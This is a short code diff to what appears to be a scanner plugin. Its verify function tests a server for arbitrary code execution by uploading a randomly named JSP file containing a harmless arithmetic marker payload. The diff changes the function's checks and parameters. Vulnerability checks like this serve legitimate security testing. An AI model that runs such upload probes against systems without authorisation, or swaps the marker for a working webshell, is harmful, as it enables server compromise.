@@ -24,12 +24,14 @@ def random_str(length):
     return "".join(random.choice(pool) for _ in range(length))
 
 
-@is_port_open
-def verify(host, port=80, name='', timeout=10):
-    if is_http(host, int(port)) is False:
-        return
+# @is_port_open
+def verify(host, port=80, name='', timeout=10, types='ip'):
+    # if is_http(host, int(port)) is False:
+    #     return
     result = ""
-
+    if types != 'ip':
+        return
+    
     payload = "<%out.println(1963*4);%>"
     filename = "{}.jsp".format(random_str(16))
     if port == 443:
@@ -62,6 +64,7 @@ def verify(host, port=80, name='', timeout=10):
                 # result += u"存在任意代码执行风险"
                 # result += u" 地址: {}".format(shell_url)
                 return info
+    return None
 
 if __name__ == '__main__':
     print(verify("127.0.0.1", 8080 ))
